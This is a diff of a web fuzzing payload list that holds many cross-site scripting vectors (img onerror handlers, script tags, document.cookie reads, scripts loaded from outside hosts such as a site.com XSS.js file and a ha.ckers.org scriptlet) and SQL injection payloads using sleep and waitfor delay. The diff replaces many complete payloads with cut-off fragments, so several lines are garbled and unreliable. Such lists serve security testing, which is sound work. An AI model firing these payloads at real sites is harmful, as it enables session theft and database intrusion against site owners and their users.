@@ -93,10 +93,10 @@ javascript&colon;confirm(
 "%20or%20sleep(5)="
 "%20or%20sleep(__TIME__)#
 "%20or%20true--
-"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
-"'`><\x00img%20src=xxx:x%20onerror=javascript:alert(1)>
-"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
-"'`><\x3Cimg%20src=xxx:x%20onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(
+"'`><\x00img%20src=xxx:x%20onerror=javascript:alert(
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(
+"'`><\x3Cimg%20src=xxx:x%20onerror=javascript:alert(
 "'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
 "'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
 "'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
@@ -156,34 +156,34 @@ javascript&colon;confirm(
 "-prompt(8)-"
 "/></a></><img src=1.gif onerror=alert(1)>
 "/></a></><img%20src=1.gif%20onerror=alert(1)>
-"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
-"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x%20/>
-"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
-"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x%20/>
-"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
-"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x%20/>
-"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
-"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x%20/>
-"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
-"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x%20/>
-"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
-"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x%20/>
-"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
-"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x%20/>
-"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
-"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x%20/>
-"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
-"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x%20/>
-";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
-";>;<;BODY%20onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+"/><img/onerror=\x09javascript:alert(
+"/><img/onerror=\x09javascript:alert(
+"/><img/onerror=\x0Ajavascript:alert(
+"/><img/onerror=\x0Ajavascript:alert(
+"/><img/onerror=\x0Bjavascript:alert(
+"/><img/onerror=\x0Bjavascript:alert(
+"/><img/onerror=\x0Cjavascript:alert(
+"/><img/onerror=\x0Cjavascript:alert(
+"/><img/onerror=\x0Djavascript:alert(
+"/><img/onerror=\x0Djavascript:alert(
+"/><img/onerror=\x20javascript:alert(
+"/><img/onerror=\x20javascript:alert(
+"/><img/onerror=\x22javascript:alert(
+"/><img/onerror=\x22javascript:alert(
+"/><img/onerror=\x27javascript:alert(
+"/><img/onerror=\x27javascript:alert(
+"/><img/onerror=\x60javascript:alert(
+"/><img/onerror=\x60javascript:alert(
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("
+";>;<;BODY%20onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("
 ";a=prompt,a()//
 ";waitfor delay '0:0:5'--
 ";waitfor delay '0:0:__TIME__'--
 ";waitfor%20delay%20'0:0:5'--
 ";waitfor%20delay%20'0:0:__TIME__'--
 ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
-">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
-">/XaDoS/><script>alert(document.cookie)</script><script%20src="http://www.site.com/XSS.js"></script>
+">/XaDoS/><script>alert(document.cookie)</script><script src="
+">/XaDoS/><script>alert(document.cookie)</script><script%20src="
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 "></iframe><script>alert(123)</script>
 "></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
@@ -204,46 +204,17 @@ javascript&colon;confirm(
 "><iframe src="javascript:alert(XSS)">
 "><iframe%20src="javascript:alert(XSS)">
 "><img src="x:x" onerror="alert(XSS)">
-"><img src=x onerror=javascript:alert("1")>
-"><img src=x onerror=javascript:alert("A")>
-"><img src=x onerror=javascript:alert('1')>
-"><img src=x onerror=javascript:alert('A')>
-"><img src=x onerror=javascript:alert(("1"))>
-"><img src=x onerror=javascript:alert(("A"))>
-"><img src=x onerror=javascript:alert(('1'))>
-"><img src=x onerror=javascript:alert(('A'))>
-"><img src=x onerror=javascript:alert((A))>
-"><img src=x onerror=javascript:alert((`1`))>
-"><img src=x onerror=javascript:alert((`A`))>
-"><img src=x onerror=javascript:alert(1)>
-"><img src=x onerror=javascript:alert(A)>
-"><img src=x onerror=javascript:alert(`1`)>
-"><img src=x onerror=javascript:alert(`A`)>
-"><img src=x onerror=window.open('https://www.google.com/');>
+"><img src=x onerror=javascript:alert(
+"><img src=x onerror=window.open('http
 "><img%20src="x:x"%20onerror="alert(XSS)">
-"><img%20src=x%20onerror=javascript:alert("1")>
-"><img%20src=x%20onerror=javascript:alert("A")>
-"><img%20src=x%20onerror=javascript:alert('1')>
-"><img%20src=x%20onerror=javascript:alert('A')>
-"><img%20src=x%20onerror=javascript:alert(("1"))>
-"><img%20src=x%20onerror=javascript:alert(("A"))>
-"><img%20src=x%20onerror=javascript:alert(('1'))>
-"><img%20src=x%20onerror=javascript:alert(('A'))>
-"><img%20src=x%20onerror=javascript:alert((A))>
-"><img%20src=x%20onerror=javascript:alert((`1`))>
-"><img%20src=x%20onerror=javascript:alert((`A`))>
-"><img%20src=x%20onerror=javascript:alert(1)>
-"><img%20src=x%20onerror=javascript:alert(A)>
-"><img%20src=x%20onerror=javascript:alert(`1`)>
-"><img%20src=x%20onerror=javascript:alert(`A`)>
-"><img%20src=x%20onerror=window.open('https://www.google.com/');>
+"><img%20src=x%20onerror=javascript:alert(
+"><img%20src=x%20onerror=window.open('http
 "><s"%2b"cript>alert(document.cookie)</script>
 "><script alert(String.fromCharCode(88,83,83))</script>
 "><script%20alert(String.fromCharCode(88,83,83))</script>
-"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert("XSS by \nxss")</script>><marquee><h1>
 "><script>alert("XSS%20by%20\nxss")</script>><marquee><h1>XSS%20by%20xss</h1></marquee>
-"><script>alert('XSS')</script>
-"><script>alert(0)</script>
+"><script>alert('
 "><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
 "><script>alert(1337)</script>"><script>alert("XSS%20by%20\nxss</h1></marquee>
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
@@ -328,7 +299,7 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 %20--%20&password=
 %20;%20alert(1);
 %20<HEAD><META%20HTTP-EQUIV="CONTENT-TYPE"%20CONTENT="text/html;%20charset=UTF-7">%20</HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-%20<OBJECT%20TYPE="text/x-scriptlet"%20DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+%20<OBJECT%20TYPE="text/x-scriptlet"%20DATA="http
 %20<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 %20><script>alert(%20XSS%20)</script>
 %20AND%201083=1083%20AND%20('1427=1427
